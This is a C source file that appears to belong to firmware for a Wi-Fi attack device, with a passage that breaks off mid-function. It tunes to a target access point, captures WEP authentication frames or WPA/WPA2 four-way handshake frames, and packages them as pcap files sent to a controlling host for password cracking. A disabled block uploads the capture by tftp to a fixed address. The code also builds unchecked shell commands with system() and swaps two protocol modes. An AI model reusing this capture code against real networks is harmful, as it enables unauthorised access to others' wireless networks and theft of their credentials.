#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <ctype.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <fcntl.h>
#include "common.h"
#include "cJSON.h"
#include "script.h"
#include "pcap.h"
#include "status.h"
#include "wifi_sniffer.h"
#include "wifi_access.h"
#include "mac80211_atk.h"
#include "mac80211_fmt.h"
#include "wifi_decrypt.h"
#include "radiotap_iter.h"
#include "platform.h"
#include "DataProcess.h"
/***********************************************************************************
 *                                  Declare
 ***********************************************************************************/
#define WEP_MAX_NUM 30000 //最多缓存2万帧
#define WEP_BUF_MAX_LEN 20<<20 //20M长度
uint8_t *Wep_Data = NULL; //wep缓存指针
uint32_t Wep_Len=0; //Wep缓存长度
struct arp_control arp_data;
bool DecryptOn = false;
struct wifi_decrypt WifiDecrypt;
struct eapol_info_t EapolInfo[MAX_CAP_STA_NUM];

char file_name[128];
uint16_t packet_data_len[MAX_CAP_STA_NUM];			// key message packet data lenth
static uint8_t packet_data[MAX_CAP_STA_NUM][2048];  // key message packet data buffer
extern int wifi_atk_ap_policy_parse(cJSON* param_ap);
FILE *Wep_File =NULL;
/***********************************************************************************
 *                                  Variable
 ***********************************************************************************/
/***********************************************************************************
 *                                  CRC 校验数组
 ***********************************************************************************/
const unsigned long int crc_tbl_osdep[256] = {0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA, 0x076DC419, 0x706AF48F,
											  0xE963A535, 0x9E6495A3, 0x0EDB8832, 0x79DCB8A4, 0xE0D5E91E, 0x97D2D988,
											  0x09B64C2B, 0x7EB17CBD, 0xE7B82D07, 0x90BF1D91, 0x1DB71064, 0x6AB020F2,
											  0xF3B97148, 0x84BE41DE, 0x1ADAD47D, 0x6DDDE4EB, 0xF4D4B551, 0x83D385C7,
											  0x136C9856, 0x646BA8C0, 0xFD62F97A, 0x8A65C9EC, 0x14015C4F, 0x63066CD9,
											  0xFA0F3D63, 0x8D080DF5, 0x3B6E20C8, 0x4C69105E, 0xD56041E4, 0xA2677172,
											  0x3C03E4D1, 0x4B04D447, 0xD20D85FD, 0xA50AB56B, 0x35B5A8FA, 0x42B2986C,
											  0xDBBBC9D6, 0xACBCF940, 0x32D86CE3, 0x45DF5C75, 0xDCD60DCF, 0xABD13D59,
											  0x26D930AC, 0x51DE003A, 0xC8D75180, 0xBFD06116, 0x21B4F4B5, 0x56B3C423,
											  0xCFBA9599, 0xB8BDA50F, 0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924,
											  0x2F6F7C87, 0x58684C11, 0xC1611DAB, 0xB6662D3D, 0x76DC4190, 0x01DB7106,
											  0x98D220BC, 0xEFD5102A, 0x71B18589, 0x06B6B51F, 0x9FBFE4A5, 0xE8B8D433,
											  0x7807C9A2, 0x0F00F934, 0x9609A88E, 0xE10E9818, 0x7F6A0DBB, 0x086D3D2D,
											  0x91646C97, 0xE6635C01, 0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E,
											  0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457, 0x65B0D9C6, 0x12B7E950,
											  0x8BBEB8EA, 0xFCB9887C, 0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65,
											  0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2, 0x4ADFA541, 0x3DD895D7,
											  0xA4D1C46D, 0xD3D6F4FB, 0x4369E96A, 0x346ED9FC, 0xAD678846, 0xDA60B8D0,
											  0x44042D73, 0x33031DE5, 0xAA0A4C5F, 0xDD0D7CC9, 0x5005713C, 0x270241AA,
											  0xBE0B1010, 0xC90C2086, 0x5768B525, 0x206F85B3, 0xB966D409, 0xCE61E49F,
											  0x5EDEF90E, 0x29D9C998, 0xB0D09822, 0xC7D7A8B4, 0x59B33D17, 0x2EB40D81,
											  0xB7BD5C3B, 0xC0BA6CAD, 0xEDB88320, 0x9ABFB3B6, 0x03B6E20C, 0x74B1D29A,
											  0xEAD54739, 0x9DD277AF, 0x04DB2615, 0x73DC1683, 0xE3630B12, 0x94643B84,
											  0x0D6D6A3E, 0x7A6A5AA8, 0xE40ECF0B, 0x9309FF9D, 0x0A00AE27, 0x7D079EB1,
											  0xF00F9344, 0x8708A3D2, 0x1E01F268, 0x6906C2FE, 0xF762575D, 0x806567CB,
											  0x196C3671, 0x6E6B06E7, 0xFED41B76, 0x89D32BE0, 0x10DA7A5A, 0x67DD4ACC,
											  0xF9B9DF6F, 0x8EBEEFF9, 0x17B7BE43, 0x60B08ED5, 0xD6D6A3E8, 0xA1D1937E,
											  0x38D8C2C4, 0x4FDFF252, 0xD1BB67F1, 0xA6BC5767, 0x3FB506DD, 0x48B2364B,
											  0xD80D2BDA, 0xAF0A1B4C, 0x36034AF6, 0x41047A60, 0xDF60EFC3, 0xA867DF55,
											  0x316E8EEF, 0x4669BE79, 0xCB61B38C, 0xBC66831A, 0x256FD2A0, 0x5268E236,
											  0xCC0C7795, 0xBB0B4703, 0x220216B9, 0x5505262F, 0xC5BA3BBE, 0xB2BD0B28,
											  0x2BB45A92, 0x5CB36A04, 0xC2D7FFA7, 0xB5D0CF31, 0x2CD99E8B, 0x5BDEAE1D,
											  0x9B64C2B0, 0xEC63F226, 0x756AA39C, 0x026D930A, 0x9C0906A9, 0xEB0E363F,
											  0x72076785, 0x05005713, 0x95BF4A82, 0xE2B87A14, 0x7BB12BAE, 0x0CB61B38,
											  0x92D28E9B, 0xE5D5BE0D, 0x7CDCEFB7, 0x0BDBDF21, 0x86D3D2D4, 0xF1D4E242,
											  0x68DDB3F8, 0x1FDA836E, 0x81BE16CD, 0xF6B9265B, 0x6FB077E1, 0x18B74777,
											  0x88085AE6, 0xFF0F6A70, 0x66063BCA, 0x11010B5C, 0x8F659EFF, 0xF862AE69,
											  0x616BFFD3, 0x166CCF45, 0xA00AE278, 0xD70DD2EE, 0x4E048354, 0x3903B3C2,
											  0xA7672661, 0xD06016F7, 0x4969474D, 0x3E6E77DB, 0xAED16A4A, 0xD9D65ADC,
											  0x40DF0B66, 0x37D83BF0, 0xA9BCAE53, 0xDEBB9EC5, 0x47B2CF7F, 0x30B5FFE9,
											  0xBDBDF21C, 0xCABAC28A, 0x53B39330, 0x24B4A3A6, 0xBAD03605, 0xCDD70693,
											  0x54DE5729, 0x23D967BF, 0xB3667A2E, 0xC4614AB8, 0x5D681B02, 0x2A6F2B94,
											  0xB40BBE37, 0xC30C8EA1, 0x5A05DF1B, 0x2D02EF8D};

/***********************************************************************************
 *                                  Function
 ***********************************************************************************/

/*****************************************************************
* 函数描述：破密初始化函数，用于初始化wep数据缓存
* 参数：	  无
* 返回值：  0 初始化成功
* 		  其他 初始化失败
****************************************************************/
int wifi_decrypt_init()
{
	Wep_Data = (uint8_t *)malloc(WEP_BUF_MAX_LEN);
	if(Wep_Data == NULL){
		return -1;
	}
	Wep_Len=0;
	return 0;
}
/*****************************************************************
 * 函数描述：解密信道设置
 * 参数：	  uint8_t ucch 设置网卡的通道号
 * 返回值： 无
 * ***************************************************************/
void wifi_decrypt_setchl(uint8_t ucchl)
{
	char cmdbuf[128];
	memset(cmdbuf,0,sizeof(cmdbuf));
//#ifdef WSPY_CAR //设置前端的角度和信道
//    gimbal_set_angle(ScanPolicy.angle.start);
//#else
//	gimbal_set_angle(ScanPolicy.angle.start,WifiDecrypt.channel);
//#endif
	sprintf(cmdbuf,"iwconfig %s channel %d",PcapInterface[ucchl],WifiDecrypt.channel);//控制网卡信道切换
	system(cmdbuf);

	usleep(1000);
}
/*****************************************************************
 * 函数描述：解密策略解析函数函数
 * 参数：	  cJSON* param json参数缓存
 * 返回值： 解析结果  0 解析正常
 * 				   其他解析 异常
 * ***************************************************************/
int wifi_decrypt_policy_parse(cJSON* param)
{
    if (param == NULL) {
    	return -1;
    }

	char data[64],cbuf[64];
	char *mac = NULL;
	char *key = NULL;
	char *encryption = NULL;

	memset(data, 0, sizeof(data));

	const char *protocol = NULL;
	uint8_t ucchl;
	int size = cJSON_GetArraySize(param);
	for (int i=0;i<size;i++){
		if (strcmp(cJSON_GetArrayItem(param, i)->string,"mac") == 0){//获取bssid
			mac = cJSON_GetArrayItem(param, i)->valuestring;
			getmac(mac, 1, WifiDecrypt.bssid);
			printf ("mac:%s\n", mac);
//			WifiDecrypt.sta[0]=0x5c;
//			WifiDecrypt.sta[1]=0xc3;
//			WifiDecrypt.sta[2]=0x07;
//			WifiDecrypt.sta[3]=0x80;
//			WifiDecrypt.sta[4]=0x2b;
//			WifiDecrypt.sta[5]=0x8d;

			WifiDecrypt.sta[0]=0x70;
			WifiDecrypt.sta[1]=0x8f;
			WifiDecrypt.sta[2]=0x47;
			WifiDecrypt.sta[3]=0x5f;
			WifiDecrypt.sta[4]=0x36;
			WifiDecrypt.sta[5]=0xa5;
		}else if (strcmp(cJSON_GetArrayItem(param, i)->string,"ch") == 0){//获取信道
			WifiDecrypt.channel = atoi((const char *)cJSON_GetArrayItem(param, i)->valuestring);
			printf ("channel:%d\n", WifiDecrypt.channel);
		}else if (strcmp(cJSON_GetArrayItem(param, i)->string,"pro") == 0){//获取协议
			protocol = cJSON_GetArrayItem(param, i)->valuestring;
			if (strcmp(protocol,"a") == 0){
				WifiDecrypt.hwmode = IEEE80211A;
			}else if (strcmp(protocol,"b") == 0){
				WifiDecrypt.hwmode = IEEE80211G;
			}else if (strcmp(protocol,"g") == 0){
				WifiDecrypt.hwmode = IEEE80211B;
			}else if (strcmp(protocol,"n") == 0){
				WifiDecrypt.hwmode = IEEE80211N;
			}
			else{
				printf("unknow protocol:\t");
			}
			printf ("protocol:%s\n", protocol);
		}else if (strcmp(cJSON_GetArrayItem(param, i)->string,"pwd") == 0){//获取密码
			key = cJSON_GetArrayItem(param, i)->valuestring;
			printf ("key:%s\n", key);
		}else if (strcmp(cJSON_GetArrayItem(param, i)->string,"encrypt") == 0){//加密类型
			encryption = cJSON_GetArrayItem(param, i)->valuestring;
			printf ("encryption:%s\n", encryption);

			if(strcmp(encryption,"WEP") == 0){  //wep加密
				WifiDecrypt.encrypt= STD_WEP;
			}else if(strcmp(encryption,"WPA-PSK") == 0){//wpa
				WifiDecrypt.encrypt= STD_WPA;
			}
			else if(strcmp(encryption,"WPA2-PSK") == 0){//wpa2
				WifiDecrypt.encrypt= STD_WPA2;
			}
			else if(strcmp(encryption,"WPA-PSK/WPA2-PSK") == 0){//wpa/wpa2
				WifiDecrypt.encrypt= STD_WPA2;
			}
			else{
				WifiDecrypt.encrypt = STD_OPN;//无加密
			}
		}

	}
	cJSON* band = cJSON_GetObjectItem(param, "band");
	if(band == NULL){
		printf ("band==NULL\n");
		return -2;
	}
	if(strcmp(band->valuestring,"2.4") == 0 ){
		ucchl =NET2G4MAJIDX;
	}
	else if(strcmp(band->valuestring,"5.8") ==0){
		ucchl=NET5G8MAJIDX;
	}
	else{
		printf("%s\n",band->valuestring);
		return -3;
	}
	if ((mac == NULL) || (protocol == NULL)||encryption == NULL){
		return -1;
	}
	wifi_decrypt_setchl(ucchl);//设置握手包的信道
//	sprintf(cbuf,"uci get wspy.wlan.dev%d",ucchl);//获取设备名称
//	sys_get(cbuf,PcapInterface[ucchl],WDEVNAME_LEN);
	//printf("%s %d chl %d dev %s\n",__func__,__LINE__,ucchl,);
	PcapOn[ucchl]=true;
	printf("pcap %d %d \n",PcapOn[ucchl],ucchl);
	DecryptOn = true;
	wifi_atkpolicy_parse(param,NULL);
    start_ap_inter();


#if 0
	for(int i=0;i<MAX_CAP_STA_NUM;i++){
		for(int j=0;j<KEY_MESSAGE_NUM;j++){
			if (EapolInfo[i].packet[j] != NULL){
				free(EapolInfo[i].packet[j]);
				EapolInfo[i].packet[j] = NULL;
			}
		}
	}

	memset(EapolInfo, 0, sizeof(struct eapol_info_t) * MAX_CAP_STA_NUM);
#else
	memset(packet_data, 0, sizeof(packet_data));//初始化pcap文件头
	for(int i=0;i<MAX_CAP_STA_NUM;i++){
			packet_data_len[i] = 0;
	}

	memset(EapolInfo, 0, sizeof(struct eapol_info_t) * MAX_CAP_STA_NUM);
	uint32_t u32sn =0;
	u32sn =htonl(DeviceSN);
	if(WifiDecrypt.encrypt == STD_WEP){
		Wep_Len=0;
		memcpy(Wep_Data , &u32sn, sizeof(u32sn));
		Wep_Len = sizeof(u32sn);
		strcpy((char *)(Wep_Data+sizeof(u32sn)),WifiDecrypt.decr_id);
		printf("dev id %s\n",(char *)(Wep_Data+sizeof(u32sn)));
		Wep_Len+=DEV_ID_LEN;
		pcapfilehead_t *pcap=(pcapfilehead_t *)(Wep_Data+Wep_Len);
		pcap->magic=htonl(0xd4c3b2a1);
		pcap->major =0x0002;// htons(0x0002);
		pcap->minor = 0x0004;//htons(0x0004);
		pcap->thiszone =0;
		pcap->sigfig =0;
		pcap->snaplen=65535;//htonl(65535);
		pcap->linktype=0x69;//htonl(0x7f);
#if WEP_FILE_OPEN
		Wep_File = fopen("./ab.cap", "wb");
		if(Wep_File != NULL){
			fwrite(Wep_Data+Wep_Len,sizeof(pcapfilehead_t),1,Wep_File);
			fflush(Wep_File);
		}
#endif
		Wep_Len+=sizeof(pcapfilehead_t);
	}
	else{
		for(int i=0;i<MAX_CAP_STA_NUM;i++){
			packet_data_len[i] = 0;

			memcpy(packet_data[i] , &u32sn, sizeof(u32sn));
			packet_data_len[i] = sizeof(u32sn);
			strcpy((char *)(packet_data[i]+sizeof(u32sn)),WifiDecrypt.decr_id);
			printf("dev id %s\n",(char *)(packet_data[i]+sizeof(u32sn)));
			packet_data_len[i]+=DEV_ID_LEN;
			pcapfilehead_t *pcap=(pcapfilehead_t *)(packet_data[i]+packet_data_len[i]);
			pcap->magic=htonl(0xd4c3b2a1);
			pcap->major =0x0002;// htons(0x0002);
			pcap->minor = 0x0004;//htons(0x0004);
			pcap->thiszone =0;
			pcap->sigfig =0;
			pcap->snaplen=65535;//htonl(65535);
			pcap->linktype=0x7f;//htonl(0x7f);
			packet_data_len[i]+=sizeof(pcapfilehead_t);
		}


		//printf("DeviceSN 0x%02x%02x%02x%02x \n", packet_data[i][0], packet_data[i][1], packet_data[i][2], packet_data[i][3]);
	}
#endif
//	crc32_init(0x4C11DB7);
	return 0;
}
/*****************************************************************
 * 函数描述：解密操作退出函数
 * 参数：	   无
 * 返回值： 无
 * ***************************************************************/
void wifi_decrypt_exit(void)
{
	PcapOn[IEEE80211_2G4] =PcapOn[IEEE80211_5G8] = false;
	sleep(1);
	DecryptOn = false;
	stop_sniffer();
	stop_ap_inter();
	printf("%s\n",__func__);
#if 0
	for(int i=0;i<MAX_CAP_STA_NUM;i++){
		for(int j=0;j<KEY_MESSAGE_NUM;j++){
			if (EapolInfo[i].packet[j] != NULL){
				free(EapolInfo[i].packet[j]);
				EapolInfo[i].packet[j] = NULL;
			}
		}
	}

	memset(EapolInfo, 0, sizeof(struct eapol_info_t) * MAX_CAP_STA_NUM);
#else
	for(int i=0;i<MAX_CAP_STA_NUM;i++){
		packet_data_len[i] = 0;
	}

	memset(packet_data, 0, sizeof(packet_data));
	memset(EapolInfo, 0, sizeof(struct eapol_info_t) * MAX_CAP_STA_NUM);
#endif
}

#if 0
void add_eapol_packet(struct eapol_info_t * eapol, const struct pcap_pkthdr * pkthdr, const uint8_t * packet)
{
	uint8_t *bssid = WifiDecrypt.bssid;

	if(eapol == NULL)
		return;

	if(memcmp(eapol->ap_mac, bssid, sizeof(eapol->ap_mac)) != 0){
		printf("add_eapol_packet: eapol->ap_mac dosen't match\n");
		return;
	}

	uint8_t flag = 0;

	for(int n=0; n<MAX_CAP_STA_NUM; n++){
		if (is_phy_addr_availible(EapolInfo[n].sta_mac) == false){ // different key message packet
			flag = 0;
			for(int n=0; n<MAX_CAP_STA_NUM; n++){
				if(memcmp(EapolInfo[n].sta_mac, eapol->sta_mac, sizeof(EapolInfo[n].sta_mac)) == 0){ //match sta mac
					flag = 1;
					break;
				}
			}

			if(flag == 1)
				break;

			EapolInfo[n].msg_id = eapol->msg_id;
			memcpy(EapolInfo[n].sta_mac, eapol->sta_mac, sizeof(EapolInfo[n].sta_mac));
			printf("capture %d key message packet\n",eapol->msg_id);

			memcpy(packet_data + packet_data_len, (void*)pkthdr, sizeof(struct pcap_pkthdr)); // save pcap_pkthdr
			packet_data_len += sizeof(struct pcap_pkthdr);

			memcpy(packet_data + packet_data_len, packet,pkthdr->caplen); // save packet data
			packet_data_len += pkthdr->caplen;

#if 0
			fwrite((void*)pkthdr, sizeof(struct pcap_pkthdr), 1, WifiDecrypt.pcap_fp);
			fwrite(packet, pkthdr->caplen, 1, WifiDecrypt.pcap_fp);
#endif
			break;
		}
	}

	for(int i=0; i<MAX_CAP_STA_NUM; i++){
		if(memcmp(EapolInfo[i].sta_mac, eapol->sta_mac, sizeof(EapolInfo[i].sta_mac)) == 0){ //match sta mac
			if((EapolInfo[i].msg_id & eapol->msg_id) == 0){ // different key message packet
				EapolInfo[i].msg_id |= eapol->msg_id;
				printf("capture %d key message packet\n",eapol->msg_id);

				memcpy(packet_data + packet_data_len, (void*)pkthdr, sizeof(struct pcap_pkthdr)); // save pcap_pkthdr
				packet_data_len += sizeof(struct pcap_pkthdr);

				memcpy(packet_data + packet_data_len, packet,pkthdr->caplen); // save packet data
				packet_data_len += pkthdr->caplen;

#if 0
				fwrite((void*)pkthdr, sizeof(struct pcap_pkthdr), 1, WifiDecrypt.pcap_fp);
				fwrite(packet, pkthdr->caplen, 1, WifiDecrypt.pcap_fp);
#endif
				if(EapolInfo[i].msg_id == 0x0f){ // capture 4 key message packet
//					DecryptOn = false;
//					PcapOn = false;
					trans_file(packet_data, packet_data_len);
					printf("trans_file packet_data_len %d\n",packet_data_len);
					memset(&EapolInfo, 0, sizeof(EapolInfo));
					packet_data_len = 0;
#if 0
					fclose(WifiDecrypt.pcap_fp);

					char cmd[256];
					memset(cmd, 0, sizeof(cmd));
					snprintf(cmd, sizeof(cmd),"tftp -p -l %s 192.168.3.96 ",file_name);
					printf("%s\n",cmd);
					system(cmd);
					usleep(500000);
#endif
				}
			}
			break;
		}
	}
}
#else
/*****************************************************************
* 函数描述：握手包id比较函数，用于比较当前接收id 与存储id是否匹配
* 参数：		uint8_t input_id 当前输入id
* 			uint8_t cur_id   缓存id
* 返回值：  0 id 匹配
* 		  -1 id 不匹配
* ***************************************************************/
int message_id_cmp(uint8_t input_id,uint8_t cur_id)
{
	int res=0;
	switch(input_id){
		case KEY_MESSAGE_1:res=-1;break;
		case KEY_MESSAGE_2:{
				if(cur_id !=KEY_MESSAGE_1&&cur_id !=0){
					res=-1;
				}
			}
			break;
		case KEY_MESSAGE_3:{
				if(cur_id !=KEY_MESSAGE_2){
					res=-1;
				}
			}
			break;
//		case KEY_MESSAGE_4:{
//				if(cur_id !=(KEY_MESSAGE_1|KEY_MESSAGE_2|KEY_MESSAGE_3)){
//					res=-1;
//				}
//			}
//			break;
		default:res=-1;break;
	}
	return res;
}
/*****************************************************************
* 函数描述：pcap头拷贝函数，用于64位头拷贝到32位头中
* 参数：	  uint8_t* packet_data,  待拷贝数据头
* 		  const struct pcap_pkthdr* pkthdr 拷贝数据头
* 返回值：  无
* ***************************************************************/
static void pcap_hdr_cpy(uint8_t* packet_data, const struct pcap_pkthdr* pkthdr)
{
    struct pcap_pkthdr_32bit* pcaphdr32 = (struct pcap_pkthdr_32bit*)packet_data;
    pcaphdr32->tv_sec                   = pkthdr->ts.tv_sec;
    pcaphdr32->tv_usec                  = pkthdr->ts.tv_usec;
    pcaphdr32->caplen                   = pkthdr->caplen;
    pcaphdr32->len                      = pkthdr->len;
}
/*****************************************************************
 * 函数描述：握手包组帧函数，将抓取的握手包组成pcap文件，发送到上位机
 * 参数：		struct eapol_info_t *  握手包帧信息缓存指针
 * 			const struct pcap_pkthdr * pkthdr  pcap文件数据缓存指针
 * 			const uint8_t * packet	数据帧缓存
 * 返回值：  无
 * ***************************************************************/
void add_eapol_packet(struct eapol_info_t * eapol, const struct pcap_pkthdr * pkthdr, const uint8_t * packet)
{
	uint8_t *bssid = WifiDecrypt.bssid;
	if(eapol == NULL)
		return;

	if(memcmp(eapol->ap_mac, bssid, sizeof(eapol->ap_mac)) != 0){
		printf("add_eapol_packet: eapol->ap_mac dosen't match\n");
		return;
	}

	uint8_t flag = 0;

	for(int n=0; n<MAX_CAP_STA_NUM; n++){
		if (is_phy_addr_availible(EapolInfo[n].sta_mac) == false){ // different key message packet
			flag = 0;
			for(int n=0; n<MAX_CAP_STA_NUM; n++){
				if(memcmp(EapolInfo[n].sta_mac, eapol->sta_mac, sizeof(EapolInfo[n].sta_mac)) == 0){ //match sta mac
					flag = 1;
					break;
				}
			}

			if(flag == 1||eapol->msg_id == KEY_MESSAGE_3||eapol->msg_id == KEY_MESSAGE_4)
				break;
			printf("capture idx %d key message msg_id %d\n",n,eapol->msg_id);
			EapolInfo[n].msg_id = eapol->msg_id;
			memcpy(EapolInfo[n].sta_mac, eapol->sta_mac, sizeof(EapolInfo[n].sta_mac));
			pcap_hdr_cpy(packet_data[n] + packet_data_len[n], pkthdr);// save pcap_pkthdr
		//	memcpy(packet_data[n] + packet_data_len[n], (void*)pkthdr, sizeof(struct pcap_pkthdr)); // save pcap_pkthdr
//			tmppkthdr=(struct pcap_pkthdr *)(packet_data[n] + packet_data_len[n]);
//			tmppkthdr->len +=sizeof(crc_result);
//			tmppkthdr->caplen+=sizeof(crc_result);
//			printf("%s %d i %d len1 %d len2 \n",__func__,__LINE__,n, tmppkthdr->len,tmppkthdr->caplen);
			packet_data_len[n] += sizeof(struct pcap_pkthdr_32bit);

			memcpy(packet_data[n] + packet_data_len[n], packet,pkthdr->caplen); // save packet data
			packet_data_len[n] += pkthdr->caplen;

//			memcpy(packet_data[n] + packet_data_len[n], &crc_result,sizeof(crc_result)); // crc
//			packet_data_len[n] += sizeof(crc_result);
			return ;
		}
	}

	for(int i=0; i<MAX_CAP_STA_NUM; i++){
		if(memcmp(EapolInfo[i].sta_mac, eapol->sta_mac, sizeof(EapolInfo[i].sta_mac)) == 0){ //match sta mac
		//	if((EapolInfo[i].msg_id & eapol->msg_id) == 0){ // different key message packet
			printf("capture idx %d key message msg_id %d\n",i,eapol->msg_id);
			if(message_id_cmp(eapol->msg_id,EapolInfo[i].msg_id ) == 0){
				EapolInfo[i].msg_id |= eapol->msg_id;
				//memcpy(packet_data[i] + packet_data_len[i], (void*)pkthdr, sizeof(struct pcap_pkthdr)); // save pcap_pkthdr
				pcap_hdr_cpy(packet_data[i] + packet_data_len[i], pkthdr);
				packet_data_len[i] += sizeof(struct pcap_pkthdr_32bit);

				memcpy(packet_data[i] + packet_data_len[i], packet,pkthdr->caplen); // save packet data
				packet_data_len[i] += pkthdr->caplen;

//				crc_result = crc32(0xffffffff, (uint8_t *)packet, pkthdr->caplen);
//				memcpy(packet_data[i] + packet_data_len[i], (void *)&crc_result,sizeof(crc_result)); // crc
//				packet_data_len[i] += sizeof(crc_result);
				printf("%s %d i %d msg_id %#02x\n",__func__,__LINE__,i,EapolInfo[i].msg_id );
				if (EapolInfo[i].msg_id  == (KEY_MESSAGE_1|KEY_MESSAGE_2) || EapolInfo[i].msg_id == (KEY_MESSAGE_2|KEY_MESSAGE_3)){ // capture 4 key message packet
					printf("%s %d i %d msg_id %#02x\n",__func__,__LINE__,i,EapolInfo[i].msg_id );
					trans_file(packet_data[i], packet_data_len[i]);
					printf("trans_file packet_data_len %d\n",packet_data_len[i]);
					for(int j=0; j<MAX_CAP_STA_NUM; j++){
						packet_data_len[j]=DEV_ID_LEN+DEV_SN_LEN+sizeof(pcapfilehead_t);
					}
					memset(EapolInfo,0,sizeof(EapolInfo));
					WifiDecrypt.resp_flag=0;
//					for(int n=0;n<MAX_CAP_STA_NUM;n++){
//						packet_data_len[n] = 0;
//					}
//
//					memset(packet_data, 0, sizeof(packet_data));
//					memset(EapolInfo, 0, sizeof(struct eapol_info_t) * MAX_CAP_STA_NUM);
				}
			}
			else{
				for(int j=0; j<MAX_CAP_STA_NUM; j++){
					packet_data_len[j]=DEV_ID_LEN+DEV_SN_LEN+sizeof(pcapfilehead_t);
				}
				memset(EapolInfo,0,sizeof(EapolInfo));
				WifiDecrypt.resp_flag=0;
				printf("error messid %d %d idx %d\n",EapolInfo[i].msg_id,eapol->msg_id,i);
			}
			break;
		}
	}
}
#endif

/*****************************************************************
 * 函数描述：握手包解析函数，用于解析存储交互的握手数据包
 * 参数：		const struct pcap_pkthdr * pkthdr  pcap缓存指针
 * 			const uint8_t * packet	数据帧缓存
 * 			uint8_t *bssid bssid
 *			uint8_t *src	源mac
 *			uint8_t *dst    目的mac
 * 返回值： 0 ：解析成功
 * 		   1：解析失败
 * ***************************************************************/
int do_wifi_decypt(const struct pcap_pkthdr * pkthdr, const uint8_t * packet, uint8_t *bssid, uint8_t *src, uint8_t *dst)
{
    const radiotap_head_t * radiotap = (const radiotap_head_t *)packet;
    const mac80211_pkt_t * mac80211 = (const mac80211_pkt_t *)(packet + radiotap->it_len);
    if (DecryptOn == false)
    	return -1;

	struct eapol_info_t eapol_info;
	memset(&eapol_info, 0, sizeof(eapol_info));

	if (is_phy_addr_availible(WifiDecrypt.bssid) == false)
		return -1;

	if (memcmp(WifiDecrypt.bssid, bssid, sizeof(WifiDecrypt.bssid)) != 0)
		return -1;

	const uint8_t *pdata = (packet + radiotap->it_len);
	uint8_t subType = (mac80211->FrameType >> 4) & 0xf;
	uint8_t Type = (mac80211->FrameType >> 2) & 0x3;
//	printf("%#02x   %d \n",subType,WifiDecrypt.resp_flag);
	if ((subType == ProbeResponse) && (WifiDecrypt.resp_flag == 0)){
			WifiDecrypt.resp_flag = 1;
			for(int i=0; i<MAX_CAP_STA_NUM; i++){
				//memcpy(packet_data[i] + packet_data_len[i], (void*)pkthdr, sizeof(struct pcap_pkthdr)); // save pcap_pkthdr
			    pcap_hdr_cpy(packet_data[i] + packet_data_len[i], pkthdr);
				packet_data_len[i] += sizeof(struct pcap_pkthdr_32bit);
				memcpy(packet_data[i] + packet_data_len[i], packet, pkthdr->caplen); // save packet data
				packet_data_len[i] += pkthdr->caplen;
			}
//			for(int i=0; i<pkthdr->caplen;i++){
//				printf("%#02x,",packet[i]);
//			}
//			printf("\n");
	}
	if (WifiDecrypt.encrypt == STD_WEP){
			if ((subType == Authentication) && (WifiDecrypt.resp_flag == 1)){

				if(memcmp(pdata+WEP_KEY_OFFSET,WEP_KEY1_STRING,6)==0){
					eapol_info.msg_id = KEY_MESSAGE_1;
				}
				else if(memcmp(pdata+WEP_KEY_OFFSET,WEP_KEY2_STRING,6)==0){
					eapol_info.msg_id = KEY_MESSAGE_2;
				}
				else if(memcmp(pdata+WEP_KEY_OFFSET,WEP_KEY4_STRING,6)==0){
					eapol_info.msg_id = KEY_MESSAGE_4;
				}
				else{
					eapol_info.msg_id = KEY_MESSAGE_3;
				}

				//printf("capture key message msg_id %d\n",eapol_info.msg_id);

				if (eapol_info.msg_id != KEY_MESSAGE_NONE){ // valid eapol packet
					if(memcmp(bssid, src, 6) == 0) {//ap mac
						memcpy(eapol_info.ap_mac, src, sizeof(eapol_info.ap_mac));
						memcpy(eapol_info.sta_mac, dst, sizeof(eapol_info.sta_mac));
					} else {
						memcpy(eapol_info.ap_mac, dst, sizeof(eapol_info.ap_mac));
						memcpy(eapol_info.sta_mac, src, sizeof(eapol_info.sta_mac));
					}

					add_eapol_packet(&eapol_info, pkthdr, packet);
				}
			}
	}
	else if ((WifiDecrypt.encrypt == STD_WPA) || (WifiDecrypt.encrypt == STD_WPA2)){
			if((subType == Beacon) && (Type == DataFrame) && (WifiDecrypt.resp_flag == 1)){ //qos data frame

				if(pkthdr->caplen <WPA_KEYLEN_OFFSET+2){
					return  -1;
				}
	//printf("%#02x  %#02x %#02x %#02x\n",pdata[WPA_EAPOL_HEAD_OFFSET],pdata[WPA_EAPOL_HEAD_OFFSET+1],pdata[WPA_EAPOL_KEYTYPE_OFFSET],pdata[WPA_EAPOL_KEYDEC_OFFSET]);
				if((memcmp(pdata+WPA_EAPOL_HEAD_OFFSET,WPA_EAPOLHEAD_STRING,2)==0)&&
						(pdata[WPA_EAPOL_KEYTYPE_OFFSET] == WPA_EAPOL_KEY_TYPE)){ //EAPOL
					uint16_t flag, type, key_len;

					memcpy(&flag, pdata+WPA_KEY_OFFSET, 2);
					flag=ntohs(flag);
					type = (flag>>6) & 0xf;


					memcpy(&key_len, pdata+WPA_KEYLEN_OFFSET, 2);
					key_len=ntohs(key_len);

					if (WifiDecrypt.encrypt == STD_WPA &&(pdata[WPA_EAPOL_KEYDEC_OFFSET] == WPA_EAPOL_KEY_DEC)){
						if (type == 0x02)
							eapol_info.msg_id = KEY_MESSAGE_1;
						else if ((type == 0x04) && (key_len != 0x00))
							eapol_info.msg_id = KEY_MESSAGE_2;
						else if (type == 0x07)
							eapol_info.msg_id = KEY_MESSAGE_3;
						else if ((type == 0x04) && (key_len == 0x00))
							eapol_info.msg_id = KEY_MESSAGE_4;
						else
							eapol_info.msg_id = KEY_MESSAGE_NONE;
					} else if (WifiDecrypt.encrypt == STD_WPA2
							&&(pdata[WPA_EAPOL_KEYDEC_OFFSET] == WPA2_EAPOL_KEY_DEC)){
						if (type == 0x02)
							eapol_info.msg_id = KEY_MESSAGE_1;
						else if (type == 0x04)
							eapol_info.msg_id = KEY_MESSAGE_2;
						else if (type == 0x0f)
							eapol_info.msg_id = KEY_MESSAGE_3;
						else if (type == 0x0c)
							eapol_info.msg_id = KEY_MESSAGE_4;
						else
							eapol_info.msg_id = KEY_MESSAGE_NONE;
					}

